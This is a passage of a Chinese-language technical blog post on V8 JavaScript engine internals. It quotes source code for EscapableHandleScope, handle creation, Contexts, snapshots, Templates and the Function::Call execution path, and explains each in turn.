class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> V8_NODISCARD EscapableHandleScope : <span class="hljs-keyword">public</span> HandleScope &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">EscapableHandleScope</span><span class="hljs-params">(Isolate* isolate)</span></span>;<br>  V8_INLINE ~<span class="hljs-built_in">EscapableHandleScope</span>() = <span class="hljs-keyword">default</span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Pushes the value into the previous scope and returns a handle to it.</span><br><span class="hljs-comment">   * Cannot be called twice.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt;<br>  <span class="hljs-function">V8_INLINE Local&lt;T&gt; <span class="hljs-title">Escape</span><span class="hljs-params">(Local&lt;T&gt; value)</span> </span>&#123;<br>    internal::Address* slot =<br>        <span class="hljs-built_in">Escape</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;internal::Address*&gt;(*value));<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Local</span>&lt;T&gt;(<span class="hljs-built_in">reinterpret_cast</span>&lt;T*&gt;(slot));<br>  &#125;<br><br>  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt;<br>  <span class="hljs-function">V8_INLINE MaybeLocal&lt;T&gt; <span class="hljs-title">EscapeMaybe</span><span class="hljs-params">(MaybeLocal&lt;T&gt; value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Escape</span>(value.<span class="hljs-built_in">FromMaybe</span>(<span class="hljs-built_in">Local</span>&lt;T&gt;()));<br>  &#125;<br><br>  <span class="hljs-built_in">EscapableHandleScope</span>(<span class="hljs-type">const</span> EscapableHandleScope&amp;) = <span class="hljs-keyword">delete</span>;<br>  <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> EscapableHandleScope&amp;) = <span class="hljs-keyword">delete</span>;<br><br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-comment">// Declaring operator new and delete as deleted is not spec compliant.</span><br>  <span class="hljs-comment">// Therefore declare them private instead to disable dynamic alloc</span><br>  <span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br>  <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">size_t</span> size);<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>*, <span class="hljs-type">size_t</span>)</span></span>;<br>  <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span>*, <span class="hljs-type">size_t</span>);<br><br>  <span class="hljs-function">internal::Address* <span class="hljs-title">Escape</span><span class="hljs-params">(internal::Address* escape_value)</span></span>;<br>  internal::Address* escape_slot_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>构造函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">EscapableHandleScope::<span class="hljs-built_in">EscapableHandleScope</span>(Isolate* v8_isolate) &#123;<br>  i::Isolate* isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(v8_isolate);<br>  escape_slot_ = <span class="hljs-built_in">CreateHandle</span>(isolate, i::<span class="hljs-built_in">ReadOnlyRoots</span>(isolate).<span class="hljs-built_in">the_hole_value</span>().<span class="hljs-built_in">ptr</span>());<br>  <span class="hljs-built_in">Initialize</span>(v8_isolate);<br>&#125;<br></code></pre></td></tr></table></figure><p>当一个<code>EscapableHandleScope</code>被创建的时候它会创建一个带有<code>the_hole_value</code>的Handle并将其存在Address中。后续作用域可以设置需要逃逸的指针地址，当到期时正常设置一个新的HandleScope。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">i::Address* <span class="hljs-title">HandleScope::CreateHandle</span><span class="hljs-params">(i::Isolate* isolate, i::Address value)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> i::HandleScope::<span class="hljs-built_in">CreateHandle</span>(isolate, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>定义在<code>handles-inl.h</code>中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Address* <span class="hljs-title">HandleScope::CreateHandle</span><span class="hljs-params">(Isolate* isolate, Address value)</span> </span>&#123;<br>  <span class="hljs-built_in">DCHECK</span>(AllowHandleAllocation::<span class="hljs-built_in">IsAllowed</span>());<br>  HandleScopeData* data = isolate-&gt;<span class="hljs-built_in">handle_scope_data</span>();<br>  Address* result = data-&gt;next;<br>  <span class="hljs-keyword">if</span> (result == data-&gt;limit) &#123;<br>    result = <span class="hljs-built_in">Extend</span>(isolate);<br>  &#125;<br>  <span class="hljs-comment">// Update the current next field, set the value in the created handle,</span><br>  <span class="hljs-comment">// and return the result.</span><br>  <span class="hljs-built_in">DCHECK_LT</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;Address&gt;(result),<br>            <span class="hljs-built_in">reinterpret_cast</span>&lt;Address&gt;(data-&gt;limit));<br>  data-&gt;next = <span class="hljs-built_in">reinterpret_cast</span>&lt;Address*&gt;(<span class="hljs-built_in">reinterpret_cast</span>&lt;Address&gt;(result) +<br>                                          <span class="hljs-built_in">sizeof</span>(Address));<br>  *result = value;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>Escape函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">i::Address* <span class="hljs-title">EscapableHandleScope::Escape</span><span class="hljs-params">(i::Address* escape_value)</span> </span>&#123;<br>  i::Heap* heap = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(<span class="hljs-built_in">GetIsolate</span>())-&gt;<span class="hljs-built_in">heap</span>();<br>  Utils::<span class="hljs-built_in">ApiCheck</span>(i::<span class="hljs-built_in">Object</span>(*escape_slot_).<span class="hljs-built_in">IsTheHole</span>(heap-&gt;<span class="hljs-built_in">isolate</span>()),<br>                  <span class="hljs-string">&quot;EscapableHandleScope::Escape&quot;</span>, <span class="hljs-string">&quot;Escape value set twice&quot;</span>);<br>  <span class="hljs-keyword">if</span> (escape_value == <span class="hljs-literal">nullptr</span>) &#123;<br>    *escape_slot_ = i::<span class="hljs-built_in">ReadOnlyRoots</span>(heap).<span class="hljs-built_in">undefined_value</span>().<span class="hljs-built_in">ptr</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>  &#125;<br>  *escape_slot_ = *escape_value;<br>  <span class="hljs-keyword">return</span> escape_slot_;<br>&#125;<br></code></pre></td></tr></table></figure><p>样例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// This function returns a new array with three elements, x, y, and z.</span><br><span class="hljs-function">Local&lt;Array&gt; <span class="hljs-title">NewPointArray</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> </span>&#123;<br>  v8::Isolate* isolate = v8::Isolate::<span class="hljs-built_in">GetCurrent</span>();<br><br>  <span class="hljs-comment">// We will be creating temporary handles so we use a handle scope.</span><br>  <span class="hljs-function">v8::EscapableHandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate)</span></span>;<br><br>  <span class="hljs-comment">// Create a new empty array.</span><br>  v8::Local&lt;v8::Array&gt; array = v8::Array::<span class="hljs-built_in">New</span>(isolate, <span class="hljs-number">3</span>);<br><br>  <span class="hljs-comment">// Return an empty result if there was an error creating the array.</span><br>  <span class="hljs-keyword">if</span> (array.<span class="hljs-built_in">IsEmpty</span>())<br>    <span class="hljs-keyword">return</span> v8::<span class="hljs-built_in">Local</span>&lt;v8::Array&gt;();<br><br>  <span class="hljs-comment">// Fill out the values</span><br>  array-&gt;<span class="hljs-built_in">Set</span>(<span class="hljs-number">0</span>, Integer::<span class="hljs-built_in">New</span>(isolate, x));<br>  array-&gt;<span class="hljs-built_in">Set</span>(<span class="hljs-number">1</span>, Integer::<span class="hljs-built_in">New</span>(isolate, y));<br>  array-&gt;<span class="hljs-built_in">Set</span>(<span class="hljs-number">2</span>, Integer::<span class="hljs-built_in">New</span>(isolate, z));<br><br>  <span class="hljs-comment">// Return the value through Escape.</span><br>  <span class="hljs-keyword">return</span> handle_scope.<span class="hljs-built_in">Escape</span>(array);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="上下文context">上下文（Context）</h1><p>上下文是ChromeV8中的JavaScript代码执行环境，所以当你想执行JavaScript代码的时候，必须为其指定一个Context：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;Script&gt; script = Script::<span class="hljs-built_in">Compile</span>(context, source).<span class="hljs-built_in">ToLocalChecked</span>();<br></code></pre></td></tr></table></figure><p>在ChromeV8中，除了Isolate实例是各自独立的，上下文也是独立且允许存在多个的。在同一个Isolate中，不同的上下文也是不相干的，其可以执行各自的JavaScript代码。</p><p>上下文对象在堆上分配，因此应该是Data对象。这允许通过 API 在 GC中进行跟踪来处理它们。具体可以参见<code>v8.h</code>中的定义<code>class V8_EXPORT Context : public Data &#123;...&#125;</code></p><p>从CPU运行时间和内存的角度来看，创建一个新的执行上下文的开销很大，但是V8的缓存机制让这个操作在第二次、第三次以及更多次数的时候让开销变小很多。原因在于这个开销的大头是解析“创建内置对象的JavaScript代码”。在第一次创建成功之后，下次创建就不需要再解析这些代码，而是直接执行这些代码来创建内置对象。与此同时，如果在编译V8的时候加入编译选项<code>snapshop=yes</code>的话，这些创建好的内置对象会被放入快照中，可在创建上下文的时候直接到快照中取。这就是ChromeV8高效的另一方面的体现了——善用缓存。具体细节会在之后的文章中探讨（<code>src/snapshot/snapshot.cc</code>)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;Context&gt; context = Context::<span class="hljs-built_in">FromSnapshot</span>(isolate, index).<span class="hljs-built_in">ToLocalChecked</span>();<br></code></pre></td></tr></table></figure><p>创建一个Context后我们可以多次进入或退出它，当我们在ContextA时也可以切换成不同的Context B，当退出B时返回A，如下图：</p><figure><img lazyload src="/img/loading.gif" data-src="https://v8.dev/_img/docs/embed/intro-contexts.png"alt="intro-contexts" /><figcaption aria-hidden="true">intro-contexts</figcaption></figure><p>需要注意的是每个上下文的内置函数和对象都是分离的，当我们创建上下文时可以设置securitytoken，具体请参阅<ahref="https://v8.dev/docs/embed#security-model">Security Model</a>。</p><h1 id="模板template">模板（Template）</h1><p>这里的模板可不是值C++中的模板，ChromeV8中的模板指的是在上下文中JavaScript对象以及函数的一个模具。你可以用一个模板来把C++函数或者数据结构包裹进JavaScript的对象中，这样JavaScript就能对它做一些不可描述的事情了。实际上GoogleChrome中的DOM节点就是用C++完成，然后再用模板包裹成JavaScript对象，这样我们就能在浏览器中使用JavaScript来对它们进行操作了。</p><p>模板是一个对象模板和函数模板的超类，需要注意的是在JavaScript中函数也能和对象一样拥有属性字段。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> Template : <span class="hljs-keyword">public</span> Data &#123;<br> <span class="hljs-keyword">public</span>:<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Set</span><span class="hljs-params">(Local&lt;Name&gt; name, Local&lt;Data&gt; value,</span></span><br><span class="hljs-params"><span class="hljs-function">           PropertyAttribute attributes = None)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetPrivate</span><span class="hljs-params">(Local&lt;Private&gt; name, Local&lt;Data&gt; value,</span></span><br><span class="hljs-params"><span class="hljs-function">                  PropertyAttribute attributes = None)</span></span>;<br>  <span class="hljs-function">V8_INLINE <span class="hljs-type">void</span> <span class="hljs-title">Set</span><span class="hljs-params">(Isolate* isolate, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, Local&lt;Data&gt; value)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetAccessorProperty</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">     Local&lt;Name&gt; name,</span></span><br><span class="hljs-params"><span class="hljs-function">     Local&lt;FunctionTemplate&gt; getter = Local&lt;FunctionTemplate&gt;(),</span></span><br><span class="hljs-params"><span class="hljs-function">     Local&lt;FunctionTemplate&gt; setter = Local&lt;FunctionTemplate&gt;(),</span></span><br><span class="hljs-params"><span class="hljs-function">     PropertyAttribute attribute = None,</span></span><br><span class="hljs-params"><span class="hljs-function">     AccessControl settings = DEFAULT)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetNativeDataProperty</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;String&gt; name, AccessorGetterCallback getter,</span></span><br><span class="hljs-params"><span class="hljs-function">      AccessorSetterCallback setter = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Value&gt; data = Local&lt;Value&gt;(), PropertyAttribute attribute = None,</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;AccessorSignature&gt; signature = Local&lt;AccessorSignature&gt;(),</span></span><br><span class="hljs-params"><span class="hljs-function">      AccessControl settings = DEFAULT,</span></span><br><span class="hljs-params"><span class="hljs-function">      SideEffectType getter_side_effect_type = SideEffectType::kHasSideEffect,</span></span><br><span class="hljs-params"><span class="hljs-function">      SideEffectType setter_side_effect_type = SideEffectType::kHasSideEffect)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetNativeDataProperty</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Name&gt; name, AccessorNameGetterCallback getter,</span></span><br><span class="hljs-params"><span class="hljs-function">      AccessorNameSetterCallback setter = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Value&gt; data = Local&lt;Value&gt;(), PropertyAttribute attribute = None,</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;AccessorSignature&gt; signature = Local&lt;AccessorSignature&gt;(),</span></span><br><span class="hljs-params"><span class="hljs-function">      AccessControl settings = DEFAULT,</span></span><br><span class="hljs-params"><span class="hljs-function">      SideEffectType getter_side_effect_type = SideEffectType::kHasSideEffect,</span></span><br><span class="hljs-params"><span class="hljs-function">      SideEffectType setter_side_effect_type = SideEffectType::kHasSideEffect)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetLazyDataProperty</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Name&gt; name, AccessorNameGetterCallback getter,</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Value&gt; data = Local&lt;Value&gt;(), PropertyAttribute attribute = None,</span></span><br><span class="hljs-params"><span class="hljs-function">      SideEffectType getter_side_effect_type = SideEffectType::kHasSideEffect,</span></span><br><span class="hljs-params"><span class="hljs-function">      SideEffectType setter_side_effect_type = SideEffectType::kHasSideEffect)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetIntrinsicDataProperty</span><span class="hljs-params">(Local&lt;Name&gt; name, Intrinsic intrinsic,</span></span><br><span class="hljs-params"><span class="hljs-function">                                PropertyAttribute attribute = None)</span></span>;<br><br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">Template</span>();<br><br>  <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectTemplate</span>;<br>  <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionTemplate</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>Set</code>函数可用于在从此模板创建的实例上设置名字和值，<code>SetAccessorProperty</code>函数用于获取或设置属性。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">PropertyAttribute</span> &#123;<br>  <span class="hljs-comment">/** None. **/</span><br>  None = <span class="hljs-number">0</span>,<br>  <span class="hljs-comment">/** ReadOnly, i.e., not writable. **/</span><br>  ReadOnly = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<br>  <span class="hljs-comment">/** DontEnum, i.e., not enumerable. **/</span><br>  DontEnum = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,<br>  <span class="hljs-comment">/** DontDelete, i.e., not configurable. **/</span><br>  DontDelete = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span><br>&#125;;<br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">AccessControl</span> &#123;<br>  DEFAULT               = <span class="hljs-number">0</span>,<br>  ALL_CAN_READ          = <span class="hljs-number">1</span>,<br>  ALL_CAN_WRITE         = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,<br>  PROHIBITS_OVERWRITING = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>本文主要介绍两种模板，这两种模板均继承自Template：</p><ul><li>函数模板（Function Template）</li><li>对象模板（Object Template）</li></ul><h2 id="函数模板function-template">函数模板（Function Template）</h2><p>函数模板在ChromeV8中的数据类型是FunctionTemplate。它是一个JavaScript函数的模具。当生成一个函数模板后，我们通过调用它的<code>GetFunction</code>方法来获取其函数具体句柄，这个函数可以被JavaScript调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> FunctionTemplate : <span class="hljs-keyword">public</span> Template &#123; ... &#125;<br></code></pre></td></tr></table></figure><p>可以用下述方法定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;FunctionTemplate&gt; ft = FunctionTemplate::<span class="hljs-built_in">New</span>(isolate_, function_callback, data);<br>Local&lt;Function&gt; function = ft-&gt;<span class="hljs-built_in">GetFunction</span>(context).<span class="hljs-built_in">ToLocalChecked</span>();<br></code></pre></td></tr></table></figure><p>同时这样调用函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">MaybeLocal&lt;Value&gt; ret = function-&gt;<span class="hljs-built_in">Call</span>(context, recv, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);<br></code></pre></td></tr></table></figure><p><code>Function::Call</code> 能在<code>src/api/api.cc</code>中找到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;v8::Value&gt; <span class="hljs-title">Function::Call</span><span class="hljs-params">(Local&lt;Context&gt; context,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     v8::Local&lt;v8::Value&gt; recv, <span class="hljs-type">int</span> argc,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     v8::Local&lt;v8::Value&gt; argv[])</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(context-&gt;<span class="hljs-built_in">GetIsolate</span>());<br>  <span class="hljs-built_in">TRACE_EVENT_CALL_STATS_SCOPED</span>(isolate, <span class="hljs-string">&quot;v8&quot;</span>, <span class="hljs-string">&quot;V8.Execute&quot;</span>);<br>  <span class="hljs-built_in">ENTER_V8</span>(isolate, context, Function, Call, <span class="hljs-built_in">MaybeLocal</span>&lt;Value&gt;(),<br>           InternalEscapableScope);<br>  <span class="hljs-function">i::TimerEventScope&lt;i::TimerEventExecute&gt; <span class="hljs-title">timer_scope</span><span class="hljs-params">(isolate)</span></span>;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  Utils::<span class="hljs-built_in">ApiCheck</span>(!self.<span class="hljs-built_in">is_null</span>(), <span class="hljs-string">&quot;v8::Function::Call&quot;</span>,<br>                  <span class="hljs-string">&quot;Function to be called is a null pointer&quot;</span>);<br>  i::Handle&lt;i::Object&gt; recv_obj = Utils::<span class="hljs-built_in">OpenHandle</span>(*recv);<br>  <span class="hljs-built_in">STATIC_ASSERT</span>(<span class="hljs-built_in">sizeof</span>(v8::Local&lt;v8::Value&gt;) == <span class="hljs-built_in">sizeof</span>(i::Handle&lt;i::Object&gt;));<br>  i::Handle&lt;i::Object&gt;* args = <span class="hljs-keyword">reinterpret_cast</span>&lt;i::Handle&lt;i::Object&gt;*&gt;(argv);<br>  Local&lt;Value&gt; result;<br>  has_pending_exception = !<span class="hljs-built_in">ToLocal</span>&lt;Value&gt;(<br>      i::Execution::<span class="hljs-built_in">Call</span>(isolate, self, recv_obj, argc, args), &amp;result);<br>  <span class="hljs-built_in">RETURN_ON_FAILED_EXECUTION</span>(Value);<br>  <span class="hljs-built_in">RETURN_ESCAPED</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到<code>Call</code>的返回值是一个<code>MaybeHandle&lt;Object&gt;</code>，会被传给定义在<code>api.h</code>内的<code>ToLocal</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">ToLocal</span><span class="hljs-params">(v8::internal::MaybeHandle&lt;v8::internal::Object&gt; maybe,</span></span><br><span class="hljs-params"><span class="hljs-function">                    Local&lt;T&gt;* local)</span> </span>&#123;<br>  v8::internal::Handle&lt;v8::internal::Object&gt; handle;<br>  <span class="hljs-keyword">if</span> (maybe.<span class="hljs-built_in">ToHandle</span>(&amp;handle)) &#123;<br>    *local = Utils::<span class="hljs-built_in">Convert</span>&lt;v8::internal::Object, T&gt;(handle);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Execution:Call</code>定义在<code>execution/execution.cc</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++]">MaybeHandle&lt;Object&gt; Execution::Call(Isolate* isolate, Handle&lt;Object&gt; callable,<br>                                    Handle&lt;Object&gt; receiver, int argc,<br>                                    Handle&lt;Object&gt; argv[]) &#123;<br>  return Invoke(isolate, InvokeParams::SetUpForCall(isolate, callable, receiver,<br>                                                    argc, argv));<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SetUpForCall</code> 返回一个 <code>InvokeParams</code>.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">V8_WARN_UNUSED_RESULT MaybeHandle&lt;Object&gt; <span class="hljs-title">Invoke</span><span class="hljs-params">(Isolate* isolate,</span></span><br><span class="hljs-params"><span class="hljs-function">                                                 <span class="hljs-type">const</span> InvokeParams&amp; params)</span> </span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">Handle&lt;Object&gt; receiver = params.is_construct                             <br>                                    ? isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">the_hole_value</span>()         <br>                                    : params.receiver; <br></code></pre></td></tr></table></figure><p>当抛出异常时<code>Invoke</code>会返回一个空对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> value = Builtins::<span class="hljs-built_in">InvokeApiFunction</span>(<br>    isolate, params.is_construct, function, receiver, params.argc,<br>    params.argv, Handle&lt;HeapObject&gt;::<span class="hljs-built_in">cast</span>(params.new_target));<br><span class="hljs-type">bool</span> has_exception = value.<span class="hljs-built_in">is_null</span>();<br><span class="hljs-built_in">DCHECK</span>(has_exception == isolate-&gt;<span class="hljs-built_in">has_pending_exception</span>());<br><span class="hljs-keyword">if</span> (has_exception) &#123;<br>  <span class="hljs-keyword">if</span> (params.message_handling == Execution::MessageHandling::kReport) 